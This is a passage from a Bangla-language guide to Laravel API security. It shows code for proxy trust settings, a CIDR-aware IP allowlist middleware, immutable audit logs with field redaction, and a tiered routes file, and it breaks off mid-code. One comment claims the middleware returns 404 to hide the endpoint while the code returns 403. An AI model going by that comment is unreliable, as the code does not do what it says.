- 🛡️ **Credential চুরির পরেও সুরক্ষা** — API key leak হলেও attacker এর IP allowlist এ নেই
- 📜 **Compliance** — অনেক audit standard এ এটা বাধ্যতামূলক

#### ⚠️ IP Allowlisting এর সীমাবদ্ধতা

| সীমাবদ্ধতা | মানে |
|-----------|------|
| Dynamic IP | বাসার ইন্টারনেটে IP প্রতিদিন বদলায় — সাধারণ user এর জন্য অচল |
| Mobile network | 4G/5G তে IP প্রতি মুহূর্তে বদলায় |
| VPN / Proxy | User VPN ব্যবহার করলেই block হয়ে যাবে |
| IP Spoofing | Proxy সঠিকভাবে configure না করলে header জাল করা যায় |

> 💡 তাই IP Allowlisting **একা যথেষ্ট নয়** — এটা একটা **অতিরিক্ত স্তর**, authentication এর বিকল্প নয়। Admin panel ও server-to-server API তে সবচেয়ে কার্যকর।

### Laravel Best Practice

#### 🚨 সবার আগে: TrustProxies ঠিক করুন

Load balancer বা Cloudflare এর পেছনে থাকলে `$request->ip()` **proxy এর IP** দেখাবে, user এর নয়। তখন —

- সবার IP একই দেখাবে → rate limiting ভেঙে যাবে
- Allowlist কাজ করবে না

**Laravel 11 / 12** — `bootstrap/app.php`:

```php
->withMiddleware(function (Middleware $middleware) {
    $middleware->trustProxies(
        at: [
            '10.0.0.0/8',        // AWS VPC / internal LB
            '172.16.0.0/12',
            '192.168.0.0/16',
            '103.21.244.0/22',   // Cloudflare
            '103.22.200.0/22',
        ],
        headers: Request::HEADER_X_FORWARDED_FOR
            | Request::HEADER_X_FORWARDED_HOST
            | Request::HEADER_X_FORWARDED_PORT
            | Request::HEADER_X_FORWARDED_PROTO,
    );
})
```

**Laravel 10 বা আগে** — `app/Http/Middleware/TrustProxies.php`:

```php
<?php

namespace App\Http\Middleware;

use Illuminate\Http\Middleware\TrustProxies as Middleware;
use Illuminate\Http\Request;

class TrustProxies extends Middleware
{
    protected $proxies = [
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
        '103.21.244.0/22',
    ];

    protected $headers = Request::HEADER_X_FORWARDED_FOR
        | Request::HEADER_X_FORWARDED_HOST
        | Request::HEADER_X_FORWARDED_PORT
        | Request::HEADER_X_FORWARDED_PROTO;
}
```

> ❌ **`protected $proxies = '*';` কখনো ব্যবহার করবেন না।** এর মানে হলো — যে কেউ `X-Forwarded-For: 1.2.3.4` header পাঠিয়ে নিজের IP মিথ্যা বলতে পারবে, ফলে rate limit ও IP allowlist দুটোই bypass হয়ে যাবে। **শুধু আপনার নিজের LB/CDN এর IP range দিন।**

#### ধাপ ১: Config ফাইল

```php
<?php
// config/security.php

return [
    'ip_allowlist' => [
        // Admin panel এ ঢোকার অনুমতি পাওয়া IP
        'admin' => array_filter(explode(',', (string) env('ADMIN_ALLOWED_IPS', ''))),

        // Internal server (cron, deploy hook, health check)
        'internal' => array_filter(explode(',', (string) env('INTERNAL_ALLOWED_IPS', '127.0.0.1'))),

        // Payment gateway এর callback IP
        'gateway' => array_filter(explode(',', (string) env('GATEWAY_ALLOWED_IPS', ''))),
    ],
];
```

```env
# .env
ADMIN_ALLOWED_IPS=103.230.107.50,45.64.99.22,192.168.1.0/24
INTERNAL_ALLOWED_IPS=10.0.1.5,10.0.1.6
GATEWAY_ALLOWED_IPS=203.0.113.0/24
```

#### ধাপ ২: Middleware (CIDR support সহ)

```php
<?php
// app/Http/Middleware/AllowedIpOnly.php

namespace App\Http\Middleware;

use App\Models\IpAllowlist;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\IpUtils;
use Symfony\Component\HttpFoundation\Response;

class AllowedIpOnly
{
    /**
     * Usage: ->middleware('allow.ip:admin')
     */
    public function handle(Request $request, Closure $next, string $group = 'admin'): Response
    {
        $ip = $request->ip();

        if (! $this->isAllowed($ip, $group)) {
            Log::channel('security')->warning('Blocked request from disallowed IP', [
                'ip'         => $ip,
                'group'      => $group,
                'path'       => $request->path(),
                'user_agent' => $request->userAgent(),
                'user_id'    => optional($request->user())->id,
            ]);

            // 404 দিলে attacker বুঝবেই না যে endpoint টা আছে (security through obscurity, bonus layer)
            return response()->json(['message' => 'Access denied.'], 403);
        }

        return $next($request);
    }

    protected function isAllowed(string $ip, string $group): bool
    {
        $allowed = array_merge(
            (array) config("security.ip_allowlist.{$group}", []),   // .env থেকে
            $this->fromDatabase($group)                             // Database থেকে
        );

        if (empty($allowed)) {
            // ⚠️ তালিকা খালি মানে ভুল configuration → নিরাপদে DENY করি
            Log::channel('security')->error("Empty IP allowlist for group [{$group}]");

            return false;
        }

        // IpUtils নিজেই CIDR (192.168.1.0/24) ও IPv6 handle করে
        return IpUtils::checkIp($ip, $allowed);
    }

    /** Database থেকে পড়া, কিন্তু cache করা - প্রতি request এ query নয় */
    protected function fromDatabase(string $group): array
    {
        return Cache::remember("ip_allowlist:{$group}", now()->addMinutes(10), function () use ($group) {
            return IpAllowlist::query()
                ->where('group', $group)
                ->active()
                ->pluck('ip_range')
                ->all();
        });
    }
}
```

> 💡 **`IpUtils::checkIp()` কেন `in_array()` এর বদলে?**
> `in_array()` শুধু হুবহু IP মেলাতে পারে। `IpUtils::checkIp()` **CIDR range** (`192.168.1.0/24` = ২৫৬টা IP) এবং **IPv6** দুটোই বোঝে। Symfony এর এই class Laravel এ already আছে, আলাদা package লাগবে না।

#### ধাপ ৩: Database-driven Allowlist (Admin UI দিয়ে পরিচালনার জন্য)

```php
<?php
// database/migrations/xxxx_create_ip_allowlists_table.php

Schema::create('ip_allowlists', function (Blueprint $table) {
    $table->id();
    $table->string('ip_range', 64);                 // "103.230.107.50" বা "192.168.1.0/24"
    $table->string('group', 32)->index();           // admin | internal | gateway
    $table->string('label')->nullable();            // "Dhaka Office"
    $table->foreignId('added_by')->nullable()->constrained('users');
    $table->timestamp('expires_at')->nullable();    // অস্থায়ী access
    $table->timestamps();

    $table->unique(['ip_range', 'group']);
});
```

```php
<?php
// app/Models/IpAllowlist.php

namespace App\Models;

use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Cache;

class IpAllowlist extends Model
{
    protected $fillable = ['ip_range', 'group', 'label', 'added_by', 'expires_at'];

    protected $casts = ['expires_at' => 'datetime'];

    public function scopeActive(Builder $query): Builder
    {
        return $query->where(
            fn (Builder $q) => $q->whereNull('expires_at')->orWhere('expires_at', '>', now())
        );
    }

    // তালিকা বদলালেই cache মুছে ফেলি
    protected static function booted(): void
    {
        static::saved(fn (self $m)   => Cache::forget("ip_allowlist:{$m->group}"));
        static::deleted(fn (self $m) => Cache::forget("ip_allowlist:{$m->group}"));
    }
}
```

#### ধাপ ৪: Route এ ব্যবহার

```php
<?php
// routes/api.php

// Admin API - IP + Auth + Role, তিন স্তর
Route::prefix('admin')
    ->middleware(['allow.ip:admin', 'auth:sanctum', 'role:admin', 'throttle:api'])
    ->group(function () {
        Route::get('/dashboard',  [AdminController::class, 'dashboard']);
        Route::get('/users',      [AdminController::class, 'users']);
        Route::post('/settings',  [AdminController::class, 'updateSettings']);
    });

// Internal endpoints - কোনো auth নেই, শুধু IP
Route::prefix('internal')
    ->middleware('allow.ip:internal')
    ->group(function () {
        Route::get('/health',      HealthCheckController::class);
        Route::post('/cache/flush', [MaintenanceController::class, 'flushCache']);
    });

// Payment gateway callback
Route::post('/callbacks/payment', [PaymentCallbackController::class, 'handle'])
    ->middleware(['allow.ip:gateway', 'webhook:gateway']);
```

#### ধাপ ৫: Artisan দিয়ে IP যোগ করা

```php
<?php
// app/Console/Commands/AllowIp.php

namespace App\Console\Commands;

use App\Models\IpAllowlist;
use Illuminate\Console\Command;

class AllowIp extends Command
{
    protected $signature = 'ip:allow {ip} {--group=admin} {--label=} {--days=}';
    protected $description = 'IP allowlist এ নতুন IP/CIDR যোগ করে';

    public function handle(): int
    {
        $record = IpAllowlist::updateOrCreate(
            ['ip_range' => $this->argument('ip'), 'group' => $this->option('group')],
            [
                'label'      => $this->option('label'),
                'expires_at' => $this->option('days') ? now()->addDays((int) $this->option('days')) : null,
            ]
        );

        $this->info("Allowed {$record->ip_range} for group [{$record->group}]");

        return self::SUCCESS;
    }
}
```

```bash
php artisan ip:allow 103.230.107.50 --group=admin --label="Dhaka Office"
php artisan ip:allow 45.64.99.22 --group=admin --label="Contractor" --days=7
```

#### 🔥 নিজেকে Lock Out করা থেকে বাঁচুন

IP allowlist এর সবচেয়ে বড় বিপদ — **ভুল IP দিয়ে নিজেই ঢুকতে না পারা।**

```php
// Middleware এ একটা escape hatch রাখুন
protected function isAllowed(string $ip, string $group): bool
{
    // Local development এ কখনো block করবে না
    if (app()->environment('local', 'testing')) {
        return true;
    }

    // ... বাকি logic
}
```

```bash
# Emergency: server থেকে সরাসরি IP যোগ করুন
php artisan ip:allow YOUR.CURRENT.IP.HERE --group=admin
php artisan cache:clear
```

> 💡 Deploy করার আগে **সবসময়** নিজের বর্তমান IP allowlist এ যোগ করে নিন। `curl ifconfig.me` দিয়ে আপনার public IP দেখতে পারবেন।

#### ✅ IP Allowlisting Checklist

- [ ] `TrustProxies` এ নির্দিষ্ট proxy IP আছে, `'*'` নেই
- [ ] `IpUtils::checkIp()` ব্যবহার করা হচ্ছে (CIDR support)
- [ ] খালি তালিকা হলে **deny** হয় (fail-closed)
- [ ] Database list cache করা আছে
- [ ] Local/testing environment এ bypass আছে
- [ ] Block হওয়া সব চেষ্টা log হচ্ছে
- [ ] Emergency এ IP যোগ করার Artisan command আছে

> 📖 IP নিয়ে আরও গভীর আলোচনা (GeoIP, auto-blocking, IP reputation, honeypot) — [laravel-ip-management-bangla-guide.md](../laravel-ip-management-bangla-guide.md)

---

## 10. Audit Logging

### What is Audit Logging?

**Audit Logging** মানে — সিস্টেমে **কে, কখন, কোথা থেকে, কি করেছে** তার স্থায়ী রেকর্ড রাখা।

সাধারণ application log আর audit log এক জিনিস নয়:

| | Application Log | Audit Log |
|--|-----------------|-----------|
| উদ্দেশ্য | Bug খুঁজে বের করা | কে কি করেছে তার **প্রমাণ** রাখা |
| উদাহরণ | "Query took 3.2s" | "User #45 deleted Order #900 at 10:32 AM from 103.x.x.x" |
| কতদিন রাখা হয় | কয়েক দিন | মাস/বছর (compliance অনুযায়ী) |
| পরিবর্তনযোগ্য? | হ্যাঁ | ❌ না — append-only হওয়া উচিত |

#### 📹 Analogy — CCTV ফুটেজ

CCTV চুরি ঠেকায় না, কিন্তু চুরি হলে **কে করেছে, কখন করেছে** তা বলে দেয়। আর CCTV আছে জানলে অনেকে চুরির চেষ্টাই করে না।

### Why do we need it?

- 🕵️ **Incident Investigation** — hack হলে বোঝা যাবে কি কি data দেখা/বদলানো হয়েছে
- 📜 **Compliance** — PCI-DSS, GDPR, ISO 27001, HIPAA — সবাই audit trail বাধ্যতামূলক করে
- ⚖️ **Accountability** — "আমি delete করিনি" বলার সুযোগ থাকবে না
- 🚨 **Anomaly Detection** — রাত ৩টায় একজন user ৫০০টা record download করছে → alert
- 🔄 **Data Recovery** — ভুলে কিছু বদলে গেলে পুরোনো মান কি ছিল জানা যাবে
- 📊 **Business Insight** — কোন feature কে কতটা ব্যবহার করছে

### Laravel Best Practice

Audit logging এর **তিনটা স্তর** — তিনটাই দরকার:

1. **HTTP Layer** — কোন request এসেছিল (middleware)
2. **Model Layer** — কোন data বদলেছে (Observer)
3. **Security Events** — login fail, permission denied (Log channel)

#### ধাপ ১: Migration

```php
<?php
// database/migrations/xxxx_create_audit_logs_table.php

Schema::create('audit_logs', function (Blueprint $table) {
    $table->id();

    // কে
    $table->foreignId('user_id')->nullable()->constrained()->nullOnDelete();
    $table->string('actor_type', 32)->default('user');   // user | api_key | system | guest
    $table->string('actor_label')->nullable();           // "Partner XYZ" বা user email

    // কি
    $table->string('event', 64)->index();                // created | updated | deleted | login | export
    $table->nullableMorphs('auditable');                 // auditable_type + auditable_id
    $table->json('old_values')->nullable();
    $table->json('new_values')->nullable();

    // কোথা থেকে
    $table->string('ip_address', 45)->nullable();
    $table->text('user_agent')->nullable();
    $table->string('method', 10)->nullable();
    $table->string('url', 2048)->nullable();
    $table->string('request_id', 64)->nullable()->index();  // এক request এর সব log একসাথে দেখার জন্য

    // ফলাফল
    $table->unsignedSmallInteger('status_code')->nullable();

    $table->timestamp('created_at')->index();   // updated_at নেই - audit log কখনো update হয় না
});
```

#### ধাপ ২: Model

```php
<?php
// app/Models/AuditLog.php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\MorphTo;

class AuditLog extends Model
{
    public const UPDATED_AT = null;   // শুধু created_at

    protected $fillable = [
        'user_id', 'actor_type', 'actor_label', 'event',
        'auditable_type', 'auditable_id', 'old_values', 'new_values',
        'ip_address', 'user_agent', 'method', 'url', 'request_id', 'status_code',
    ];

    protected $casts = [
        'old_values' => 'array',
        'new_values' => 'array',
        'created_at' => 'datetime',
    ];

    public function user(): BelongsTo
    {
        return $this->belongsTo(User::class);
    }

    public function auditable(): MorphTo
    {
        return $this->morphTo();
    }

    /** 🔒 Audit log কখনো পরিবর্তন বা মুছে ফেলা যাবে না */
    protected static function booted(): void
    {
        static::updating(fn () => throw new \RuntimeException('Audit logs are immutable.'));
        static::deleting(fn () => throw new \RuntimeException('Audit logs cannot be deleted.'));
    }
}
```

#### ধাপ ৩: Model Observer — Data পরিবর্তন track করা

```php
<?php
// app/Observers/AuditableObserver.php

namespace App\Observers;

use App\Models\AuditLog;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Request;

class AuditableObserver
{
    /** 🔒 এই field গুলো কখনো log এ যাবে না */
    protected array $redacted = [
        'password', 'remember_token', 'api_token', 'secret',
        'signing_secret', 'card_number', 'cvv', 'nid_number',
    ];

    public function created(Model $model): void
    {
        $this->record($model, 'created', null, $model->getAttributes());
    }

    public function updated(Model $model): void
    {
        // শুধু যেগুলো সত্যিই বদলেছে
        $changes = $model->getChanges();

        unset($changes['updated_at']);

        if (empty($changes)) {
            return;
        }

        $old = array_intersect_key($model->getOriginal(), $changes);

        $this->record($model, 'updated', $old, $changes);
    }

    public function deleted(Model $model): void
    {
        $this->record($model, 'deleted', $model->getOriginal(), null);
    }

    protected function record(Model $model, string $event, ?array $old, ?array $new): void
    {
        AuditLog::create([
            'user_id'        => Auth::id(),
            'actor_type'     => Auth::check() ? 'user' : 'system',
            'actor_label'    => optional(Auth::user())->email,
            'event'          => $event,
            'auditable_type' => $model::class,
            'auditable_id'   => $model->getKey(),
            'old_values'     => $this->redact($old),
            'new_values'     => $this->redact($new),
            'ip_address'     => Request::ip(),
            'user_agent'     => Request::userAgent(),
            'method'         => Request::method(),
            'url'            => Request::fullUrl(),
            'request_id'     => Request::header('X-Request-Id'),
        ]);
    }

    /** Sensitive field গুলো [REDACTED] দিয়ে বদলে দেয় */
    protected function redact(?array $values): ?array
    {
        if (is_null($values)) {
            return null;
        }

        foreach ($this->redacted as $field) {
            if (array_key_exists($field, $values)) {
                $values[$field] = '[REDACTED]';
            }
        }

        return $values;
    }
}
```

**Observer register করা:**

```php
<?php
// app/Providers/AppServiceProvider.php

use App\Models\{Order, Payment, User};
use App\Observers\AuditableObserver;

public function boot(): void
{
    // যে model গুলোর পরিবর্তন track করতে চান
    foreach ([User::class, Order::class, Payment::class] as $model) {
        $model::observe(AuditableObserver::class);
    }
}
```

Laravel 11/12 এ Attribute দিয়েও করা যায়:

```php
<?php
// app/Models/Order.php

use App\Observers\AuditableObserver;
use Illuminate\Database\Eloquent\Attributes\ObservedBy;

#[ObservedBy(AuditableObserver::class)]
class Order extends Model
{
    // ...
}
```

#### ধাপ ৪: HTTP Layer — Terminable Middleware

Response পাঠানোর **পরে** log লিখলে user কে অপেক্ষা করতে হয় না।

```php
<?php
// app/Http/Middleware/AuditApiRequests.php

namespace App\Http\Middleware;

use App\Models\AuditLog;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Symfony\Component\HttpFoundation\Response;

class AuditApiRequests
{
    /** এই method গুলো log হবে (GET log করলে volume বিশাল হয়ে যায়) */
    protected array $methods = ['POST', 'PUT', 'PATCH', 'DELETE'];

    protected array $redactedInputs = [
        'password', 'password_confirmation', 'current_password',
        'token', 'secret', 'card_number', 'cvv',
    ];

    public function handle(Request $request, Closure $next): Response
    {
        // প্রতিটা request এর জন্য unique id - log গুলো একসাথে খুঁজে পেতে সাহায্য করে
        $request->headers->set('X-Request-Id', $request->header('X-Request-Id') ?: (string) Str::uuid());

        $response = $next($request);

        $response->headers->set('X-Request-Id', $request->header('X-Request-Id'));

        return $response;
    }

    /** Response পাঠানোর পরে চলে - user অপেক্ষা করে না */
    public function terminate(Request $request, Response $response): void
    {
        if (! in_array($request->method(), $this->methods, true)) {
            return;
        }

        $apiKey = $request->attributes->get('api_key');

        AuditLog::create([
            'user_id'     => optional($request->user())->id,
            'actor_type'  => $apiKey ? 'api_key' : ($request->user() ? 'user' : 'guest'),
            'actor_label' => $apiKey?->name ?? optional($request->user())->email,
            'event'       => 'api_request',
            'new_values'  => $request->except($this->redactedInputs),
            'ip_address'  => $request->ip(),
            'user_agent'  => $request->userAgent(),
            'method'      => $request->method(),
            'url'         => $request->fullUrl(),
            'request_id'  => $request->header('X-Request-Id'),
            'status_code' => $response->getStatusCode(),
        ]);
    }
}
```

> 💡 **Terminable Middleware কি?** `handle()` চলে request এর সময়, আর `terminate()` চলে **response পাঠানোর পর**। ভারী কাজ (log লেখা, analytics) `terminate()` এ রাখলে API এর response time এ কোনো প্রভাব পড়ে না। বিস্তারিত: [middleware-bangla-guide.md](../middleware-bangla-guide.md)

#### ধাপ ৫: Security Log Channel

সব security event একটা আলাদা file এ রাখুন — খুঁজে পাওয়া সহজ হয়।

```php
<?php
// config/logging.php

'channels' => [

    'security' => [
        'driver'               => 'daily',
        'path'                 => storage_path('logs/security.log'),
        'level'                => 'info',
        'days'                 => 90,          // compliance অনুযায়ী বাড়ান
        'permission'           => 0640,
        'replace_placeholders' => true,
    ],

    'audit' => [
        'driver' => 'stack',
        'channels' => ['security', 'slack'],   // গুরুতর হলে Slack এও যাবে
        'ignore_exceptions' => false,
    ],

    'slack' => [
        'driver'   => 'slack',
        'url'      => env('LOG_SLACK_WEBHOOK_URL'),
        'username' => 'Security Bot',
        'emoji'    => ':rotating_light:',
        'level'    => 'critical',
    ],
],
```

#### ধাপ ৬: Authentication Event গুলো Log করা

```php
<?php
// app/Listeners/LogAuthenticationEvents.php

namespace App\Listeners;

use Illuminate\Auth\Events\Failed;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Auth\Events\Login;
use Illuminate\Auth\Events\Logout;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Request;

class LogAuthenticationEvents
{
    public function handleLogin(Login $event): void
    {
        Log::channel('security')->info('User logged in', [
            'user_id' => $event->user->getAuthIdentifier(),
            'email'   => $event->user->email ?? null,
            'ip'      => Request::ip(),
            'agent'   => Request::userAgent(),
        ]);
    }

    public function handleFailed(Failed $event): void
    {
        Log::channel('security')->warning('Failed login attempt', [
            'email' => $event->credentials['email'] ?? null,
            'ip'    => Request::ip(),
            'agent' => Request::userAgent(),
        ]);
    }

    public function handleLockout(Lockout $event): void
    {
        // Rate limit hit হয়েছে - এটা গুরুতর
        Log::channel('audit')->critical('Login lockout triggered', [
            'ip'    => Request::ip(),
            'email' => $event->request->input('email'),
        ]);
    }

    public function handleLogout(Logout $event): void
    {
        Log::channel('security')->info('User logged out', [
            'user_id' => optional($event->user)->getAuthIdentifier(),
            'ip'      => Request::ip(),
        ]);
    }

    public function subscribe($events): array
    {
        return [
            Login::class   => 'handleLogin',
            Failed::class  => 'handleFailed',
            Lockout::class => 'handleLockout',
            Logout::class  => 'handleLogout',
        ];
    }
}
```

```php
<?php
// app/Providers/AppServiceProvider.php

use App\Listeners\LogAuthenticationEvents;
use Illuminate\Support\Facades\Event;

public function boot(): void
{
    Event::subscribe(LogAuthenticationEvents::class);
}
```

> 📖 Event/Listener নিয়ে বিস্তারিত: [events-listeners-bangla-guide.md](../events-listeners-bangla-guide.md)

#### ধাপ ৭: Performance — Queue ব্যবহার করুন

Traffic বেশি হলে প্রতি request এ database write করলে API ধীর হয়ে যায়।

```php
<?php
// app/Jobs/RecordAuditLog.php

namespace App\Jobs;

use App\Models\AuditLog;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;

class RecordAuditLog implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    public function __construct(protected array $attributes) {}

    public function handle(): void
    {
        AuditLog::create($this->attributes);
    }
}
```

```php
// Observer/Middleware এ:
RecordAuditLog::dispatch($attributes)->onQueue('audit');
```

> 📖 Queue নিয়ে বিস্তারিত: [queues-jobs-bangla-guide.md](../queues-jobs-bangla-guide.md)

#### ধাপ ৮: Retention Policy

```php
<?php
// routes/console.php

use App\Models\AuditLog;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schedule;

Schedule::call(function () {
    // ⚠️ Model এর deleting() guard bypass করতে query builder ব্যবহার করছি
    DB::table('audit_logs')
        ->where('created_at', '<', now()->subYear())
        ->limit(10000)                 // একবারে সব মুছলে DB lock হয়ে যাবে
        ->delete();
})->dailyAt('02:00')->name('prune-audit-logs');
```

> ⚠️ **মুছে ফেলার আগে compliance requirement দেখে নিন।** PCI-DSS এ ১ বছর, GDPR এ "যতদিন প্রয়োজন", অনেক আর্থিক প্রতিষ্ঠানে ৭ বছর পর্যন্ত রাখতে হয়। মুছে ফেলার বদলে cold storage (S3 Glacier) এ archive করা ভালো।

#### 🔒 কি কখনো Log করবেন না

| ❌ কখনো না | কারণ |
|-----------|------|
| Password (hash সহ) | Log file leak হলে সব account বিপন্ন |
| API Key / Token এর পূর্ণ মান | Log পড়ে যে কেউ ব্যবহার করতে পারবে |
| Credit card number, CVV | PCI-DSS violation — জরিমানা হতে পারে |
| NID / Passport number | GDPR / privacy law violation |
| OTP / 2FA code | Account takeover এর সুযোগ |
| সম্পূর্ণ request body (অন্ধভাবে) | উপরের সবকিছু ঢুকে যেতে পারে |

**✅ সঠিক উপায় — masking:**

```php
// পুরো key নয়, শুধু চেনার মতো অংশ
'api_key' => substr($key, 0, 8) . '...' . substr($key, -4),   // sk_live_...9f2c
'card'    => '**** **** **** ' . substr($card, -4),
'email'   => Str::mask($email, '*', 2, 4),                     // ab****@example.com
```

#### 📊 Audit Log দেখার জন্য Query

```php
<?php

// একটা নির্দিষ্ট Order এ কে কি করেছে
AuditLog::where('auditable_type', Order::class)
    ->where('auditable_id', $orderId)
    ->with('user:id,name,email')
    ->latest()
    ->get();

// একজন user এর গত ৭ দিনের সব কাজ
AuditLog::where('user_id', $userId)
    ->where('created_at', '>=', now()->subDays(7))
    ->latest()
    ->paginate(50);

// সন্দেহজনক: একই IP থেকে একাধিক account
AuditLog::select('ip_address', DB::raw('COUNT(DISTINCT user_id) as user_count'))
    ->where('created_at', '>=', now()->subDay())
    ->groupBy('ip_address')
    ->having('user_count', '>', 5)
    ->get();

// এক request এর পুরো chain (X-Request-Id দিয়ে)
AuditLog::where('request_id', $requestId)->orderBy('created_at')->get();
```

#### ✅ Audit Logging Checklist

- [ ] সব write operation (POST/PUT/PATCH/DELETE) log হচ্ছে
- [ ] Login success/fail/lockout log হচ্ছে
- [ ] Sensitive field redact/mask করা হচ্ছে
- [ ] Audit log immutable (`updating`/`deleting` blocked)
- [ ] `X-Request-Id` দিয়ে log গুলো একসাথে খুঁজে পাওয়া যায়
- [ ] Terminable middleware বা Queue ব্যবহার হচ্ছে (performance)
- [ ] Retention policy ও archival ঠিক করা আছে
- [ ] Log file এর permission `0640`, web root এর বাইরে

---

## সব Layer একসাথে - Complete `routes/api.php`

এখন দেখা যাক ১০টা layer বাস্তবে কিভাবে একসাথে কাজ করে। **সব endpoint এ সব layer লাগবে না** — কোন endpoint কতটা সংবেদনশীল, সেই অনুযায়ী layer বাছুন।

```php
<?php
// routes/api.php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Tier 1: Public — কোনো authentication নেই
| Layers: Rate Limit + Input Sanitization + CORS
|--------------------------------------------------------------------------
*/
Route::middleware('throttle:public')->group(function () {
    Route::get('/products',           [ProductController::class, 'index']);
    Route::get('/products/{product}', [ProductController::class, 'show']);
});

/*
|--------------------------------------------------------------------------
| Tier 2: Authentication — সবচেয়ে বেশি আক্রমণের শিকার হয়
| Layers: কড়া Rate Limit + Input Sanitization + Audit Logging
|--------------------------------------------------------------------------
*/
Route::middleware('throttle:login')->post('/login',           [AuthController::class, 'login']);
Route::middleware('throttle:3,60')->post('/register',         [AuthController::class, 'register']);
Route::middleware('throttle:otp')->post('/send-otp',          [OtpController::class, 'send']);
Route::middleware('throttle:3,60')->post('/forgot-password',  [PasswordController::class, 'forgot']);

/*
|--------------------------------------------------------------------------
| Tier 3: Authenticated User API (নিজের mobile app / SPA)
| Layers: Sanctum + Rate Limit + Input Sanitization + Policy + Audit
|--------------------------------------------------------------------------
*/
Route::middleware(['auth:sanctum', 'throttle:api', 'audit'])->group(function () {
    Route::get('/me', fn (Request $request) => new UserResource($request->user()));

    Route::apiResource('orders', OrderController::class);
    Route::apiResource('addresses', AddressController::class);

    // ভারী কাজে অতিরিক্ত throttle
    Route::post('/orders/export', [OrderController::class, 'export'])
        ->middleware('throttle:heavy');
});

/*
|--------------------------------------------------------------------------
| Tier 4: Third-party Developer Platform (OAuth 2.0)
| Layers: Passport + Scopes + Rate Limit + Audit
|--------------------------------------------------------------------------
*/
Route::prefix('v1')->middleware(['auth:api', 'throttle:plan', 'audit'])->group(function () {
    Route::get('/profile',  [ApiProfileController::class, 'show'])->middleware('scopes:profile:read');
    Route::get('/orders',   [ApiOrderController::class, 'index'])->middleware('scopes:orders:read');
    Route::post('/orders',  [ApiOrderController::class, 'store'])->middleware('scopes:orders:write');
});

/*
|--------------------------------------------------------------------------
| Tier 5: Partner Server-to-Server API
| Layers: API Key + IP Allowlist + Per-key Rate Limit + Audit
|--------------------------------------------------------------------------
*/
Route::prefix('v1/partner')
    ->middleware(['api.key', 'throttle:api-key', 'audit'])
    ->group(function () {
        Route::get('/inventory',  [PartnerInventoryController::class, 'index'])
            ->middleware('api.key:inventory:read');

        Route::post('/inventory', [PartnerInventoryController::class, 'sync'])
            ->middleware('api.key:inventory:write');
    });

/*
|--------------------------------------------------------------------------
| Tier 6: High-value Financial API — সর্বোচ্চ নিরাপত্তা
| Layers: mTLS + IP Allowlist + API Key + Request Signing + Rate Limit + Audit
|--------------------------------------------------------------------------
*/
Route::prefix('v1/secure')
    ->middleware([
        'mtls',              // 7. Mutual TLS
        'allow.ip:gateway',  // 9. IP Allowlisting
        'api.key',           // 2. API Key
        'signed.request',    // 8. Request Signing
        'throttle:api-key',  // 1. Rate Limiting
        'audit',             // 10. Audit Logging
    ])
    ->group(function () {
        Route::post('/payments',    [PaymentController::class, 'store']);
        Route::post('/refunds',     [RefundController::class, 'store']);
        Route::post('/settlements', [SettlementController::class, 'store']);
    });

/*
|--------------------------------------------------------------------------
| Tier 7: Incoming Webhooks — অন্যরা আমাদের কল করে
| Layers: IP Allowlist + Signature Verification + Audit
|--------------------------------------------------------------------------
*/
Route::post('/webhooks/stripe',  [StripeWebhookController::class, 'handle'])
    ->middleware(['allow.ip:gateway', 'webhook:stripe']);

Route::post('/webhooks/bkash',   [BkashWebhookController::class, 'handle'])
    ->middleware(['allow.ip:gateway', 'webhook:bkash']);

/*
|--------------------------------------------------------------------------
| Tier 8: Admin API
| Layers: IP Allowlist + Sanctum + Role + Rate Limit + Audit
|--------------------------------------------------------------------------
*/
Route::prefix('admin')
    ->middleware(['allow.ip:admin', 'auth:sanctum', 'role:admin', 'throttle:api', 'audit'])
    ->group(function () {
        Route::get('/dashboard',   [AdminController::class, 'dashboard']);
        Route::apiResource('users', AdminUserController::class);
        Route::get('/audit-logs',  [AuditLogController::class, 'index']);
    });

/*
|--------------------------------------------------------------------------
| Tier 9: Internal — শুধু নিজেদের server থেকে
| Layers: IP Allowlist
|--------------------------------------------------------------------------
*/
Route::prefix('internal')->middleware('allow.ip:internal')->group(function () {
    Route::get('/health',        HealthCheckController::class);
    Route::post('/cache/flush',  [MaintenanceController::class, 'flushCache']);
});
```

### 🧩 সম্পূর্ণ Middleware Registration

```php
<?php
// bootstrap/app.php  (Laravel 11 / 12)

use App\Http\Middleware\{
    AllowedIpOnly, AuditApiRequests, AuthenticateApiKey, SanitizeInput,
    ValidateJwt, VerifyClientCertificate, VerifyRequestSignature, VerifyWebhookSignature
};
use Illuminate\Foundation\Application;
use Illuminate\Foundation\Configuration\Middleware;
use Illuminate\Http\Request;

return Application::configure(basePath: dirname(__DIR__))
    ->withRouting(
        web:      __DIR__.'/../routes/web.php',
        api:      __DIR__.'/../routes/api.php',
        commands: __DIR__.'/../routes/console.php',
        health:   '/up',
    )
    ->withMiddleware(function (Middleware $middleware) {

        // ── Proxy বিশ্বাস (rate limit ও IP allowlist এর ভিত্তি) ──
        $middleware->trustProxies(
            at: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'],
            headers: Request::HEADER_X_FORWARDED_FOR
                | Request::HEADER_X_FORWARDED_HOST
                | Request::HEADER_X_FORWARDED_PORT
                | Request::HEADER_X_FORWARDED_PROTO,
        );

        // ── সব API request এ প্রযোজ্য ──
        $middleware->api(prepend: [
            'throttle:api',                  // 1. Rate Limiting
        ]);

        $middleware->api(append: [
